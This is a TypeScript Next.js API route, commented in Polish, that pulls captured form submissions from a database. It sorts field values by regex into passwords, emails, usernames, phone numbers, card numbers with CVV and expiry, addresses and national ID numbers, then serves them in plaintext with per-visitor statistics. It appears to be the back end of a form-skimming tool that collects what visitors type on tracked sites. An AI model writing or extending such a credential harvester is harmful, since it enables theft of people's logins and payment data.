import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/db';
import { isAuthenticated } from '@/lib/auth';

export const dynamic = 'force-dynamic';

// Wzorce do wykrywania pól z danymi logowania
const CREDENTIAL_PATTERNS = {
    // Pola z loginami/nazwami użytkowników
    username: [
        /user(name)?/i,
        /login/i,
        /account/i,
        /nick(name)?/i,
        /identyfi(er|kator)/i,
        /u[zż]ytkownik/i,
    ],
    // Pola z emailami
    email: [
        /e[-_]?mail/i,
        /mail/i,
        /@.*\./i, // wzorzec w wartości
    ],
    // Pola z hasłami
    password: [
        /pass(word)?/i,
        /haslo/i,
        /has[łl]o/i,
        /secret/i,
        /pwd/i,
        /pin/i,
    ],
    // Numery telefonów
    phone: [
        /phone/i,
        /tel(efon)?/i,
        /mobile/i,
        /komórka/i,
        /numer/i,
    ],
    // Numery kart
    card: [
        /card/i,
        /karta/i,
        /cc_?num/i,
        /cvv/i,
        /cvc/i,
        /expir/i,
    ],
    // Adresy
    address: [
        /address/i,
        /adres/i,
        /street/i,
        /ulica/i,
        /city/i,
        /miasto/i,
        /zip/i,
        /kod_pocztowy/i,
    ],
    // Dane osobowe
    personal: [
        /name/i,
        /imie/i,
        /imi[eę]/i,
        /nazwisko/i,
        /surname/i,
        /first_?name/i,
        /last_?name/i,
        /pesel/i,
        /nip/i,
        /regon/i,
    ],
};

// Wzorce walidacji wartości
const VALUE_PATTERNS = {
    email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    phone: /^\+?[\d\s\-()]{8,}$/,
    card: /^\d{13,19}$/,
};

interface ExtractedCredential {
    id: string;
    timestamp: string;
    siteId: string;
    sessionId: string;
    visitorId: string;
    formId: string | null;
    formName: string | null;
    pageUrl: string | null;
    fieldName: string;
    fieldValue: string;
    credentialType: string;
    confidence: 'high' | 'medium' | 'low';
}

// Funkcja do klasyfikacji pola
function classifyField(fieldName: string, fieldValue: string): { type: string; confidence: 'high' | 'medium' | 'low' } | null {
    const lowerName = fieldName.toLowerCase();
    const lowerValue = typeof fieldValue === 'string' ? fieldValue.toLowerCase() : '';

    // Sprawdź wartość pod kątem emaila (wysokie prawdopodobieństwo)
    if (VALUE_PATTERNS.email.test(fieldValue)) {
        return { type: 'email', confidence: 'high' };
    }

    // Sprawdź wartość pod kątem telefonu
    if (VALUE_PATTERNS.phone.test(fieldValue.replace(/\s/g, ''))) {
        if (CREDENTIAL_PATTERNS.phone.some(p => p.test(lowerName))) {
            return { type: 'phone', confidence: 'high' };
        }
    }

    // Sprawdź nazwę pola dla haseł
    if (CREDENTIAL_PATTERNS.password.some(p => p.test(lowerName))) {
        return { type: 'password', confidence: 'high' };
    }

    // Sprawdź nazwę pola dla emaili
    if (CREDENTIAL_PATTERNS.email.some(p => p.test(lowerName))) {
        return { type: 'email', confidence: 'medium' };
    }

    // Sprawdź nazwę pola dla loginów
    if (CREDENTIAL_PATTERNS.username.some(p => p.test(lowerName))) {
        return { type: 'username', confidence: 'medium' };
    }

    // Sprawdź nazwę pola dla telefonów
    if (CREDENTIAL_PATTERNS.phone.some(p => p.test(lowerName))) {
        return { type: 'phone', confidence: 'medium' };
    }

    // Sprawdź nazwę pola dla kart
    if (CREDENTIAL_PATTERNS.card.some(p => p.test(lowerName))) {
        return { type: 'card', confidence: 'high' };
    }

    // Sprawdź nazwę pola dla adresów
    if (CREDENTIAL_PATTERNS.address.some(p => p.test(lowerName))) {
        return { type: 'address', confidence: 'low' };
    }

    // Sprawdź nazwę pola dla danych osobowych
    if (CREDENTIAL_PATTERNS.personal.some(p => p.test(lowerName))) {
        return { type: 'personal', confidence: 'low' };
    }

    return null;
}

// Funkcja do ekstrakcji danych z formularza
function extractCredentials(
    formId: string,
    formSubmission: {
        id: string;
        timestamp: string;
        site_id: string;
        session_id: string;
        visitor_id: string;
        form_id: string | null;
        form_name: string | null;
        page_url: string | null;
        form_data: string;
    }
): ExtractedCredential[] {
    const credentials: ExtractedCredential[] = [];
    
    try {
        const formData = JSON.parse(formSubmission.form_data || '{}');
        
        for (const [fieldName, fieldValue] of Object.entries(formData)) {
            // Pomijamy puste wartości
            if (!fieldValue || (typeof fieldValue === 'string' && fieldValue.trim() === '')) {
                continue;
            }

            const valueStr = typeof fieldValue === 'string' ? fieldValue : JSON.stringify(fieldValue);
            const classification = classifyField(fieldName, valueStr);

            if (classification) {
                credentials.push({
                    id: `${formSubmission.id}-${fieldName}`,
                    timestamp: formSubmission.timestamp,
                    siteId: formSubmission.site_id,
                    sessionId: formSubmission.session_id,
                    visitorId: formSubmission.visitor_id,
                    formId: formSubmission.form_id,
                    formName: formSubmission.form_name,
                    pageUrl: formSubmission.page_url,
                    fieldName: fieldName,
                    fieldValue: valueStr,
                    credentialType: classification.type,
                    confidence: classification.confidence,
                });
            }
        }
    } catch (err) {
        console.error(`[API/credentials] Error parsing form data for ${formId}:`, err);
    }

    return credentials;
}

export async function GET(request: NextRequest) {
    // Sprawdź autoryzację
    if (!isAuthenticated(request)) {
        return NextResponse.json(
            { status: 'error', message: 'Unauthorized' },
            { status: 401 }
        );
    }

    try {
        const { searchParams } = new URL(request.url);
        const siteId = searchParams.get('site_id');
        const credentialType = searchParams.get('type'); // email, password, username, phone, card, address, personal
        const confidence = searchParams.get('confidence'); // high, medium, low
        const limit = Math.min(parseInt(searchParams.get('limit') || '100'), 500);
        const offset = parseInt(searchParams.get('offset') || '0');
        const days = parseInt(searchParams.get('days') || '30');

        const db = getDb();
        const since = new Date(Date.now() - days * 24 * 60 * 60 * 1000).toISOString();

        // Pobierz wszystkie formularze z danego zakresu czasu
        let query = `
            SELECT 
                id,
                timestamp,
                site_id,
                session_id,
                visitor_id,
                form_id,
                form_name,
                page_url,
                form_data
            FROM form_submissions
            WHERE timestamp >= ?
        `;

        const params: (string | number)[] = [since];

        if (siteId) {
            query += ' AND site_id = ?';
            params.push(siteId);
        }

        query += ' ORDER BY timestamp DESC';

        const formSubmissions = db.prepare(query).all(...params) as Array<{
            id: string;
            timestamp: string;
            site_id: string;
            session_id: string;
            visitor_id: string;
            form_id: string | null;
            form_name: string | null;
            page_url: string | null;
            form_data: string;
        }>;

        // Wyciągnij dane logowania z każdego formularza
        let allCredentials: ExtractedCredential[] = [];
        
        for (const form of formSubmissions) {
            const extracted = extractCredentials(form.id, form);
            allCredentials.push(...extracted);
        }

        // Filtruj po typie jeśli podano
        if (credentialType && credentialType !== 'all') {
            allCredentials = allCredentials.filter(c => c.credentialType === credentialType);
        }

        // Filtruj po poziomie pewności
        if (confidence && confidence !== 'all') {
            allCredentials = allCredentials.filter(c => c.confidence === confidence);
        }

        // Paginacja
        const total = allCredentials.length;
        const paginatedCredentials = allCredentials.slice(offset, offset + limit);

        // Statystyki
        const stats = {
            total: total,
            byType: {
                email: allCredentials.filter(c => c.credentialType === 'email').length,
                password: allCredentials.filter(c => c.credentialType === 'password').length,
                username: allCredentials.filter(c => c.credentialType === 'username').length,
                phone: allCredentials.filter(c => c.credentialType === 'phone').length,
                card: allCredentials.filter(c => c.credentialType === 'card').length,
                address: allCredentials.filter(c => c.credentialType === 'address').length,
                personal: allCredentials.filter(c => c.credentialType === 'personal').length,
            },
            byConfidence: {
                high: allCredentials.filter(c => c.confidence === 'high').length,
                medium: allCredentials.filter(c => c.confidence === 'medium').length,
                low: allCredentials.filter(c => c.confidence === 'low').length,
            },
            uniqueSessions: new Set(allCredentials.map(c => c.sessionId)).size,
            uniqueVisitors: new Set(allCredentials.map(c => c.visitorId)).size,
        };

        return NextResponse.json({
            credentials: paginatedCredentials,
            stats,
            pagination: {
                limit,
                offset,
                total,
                hasMore: offset + limit < total
            }
        });

    } catch (error) {
        console.error('[API/credentials] Error:', error);
        return NextResponse.json(
            { status: 'error', message: 'Internal Server Error' },
            { status: 500 }
        );
    }
}

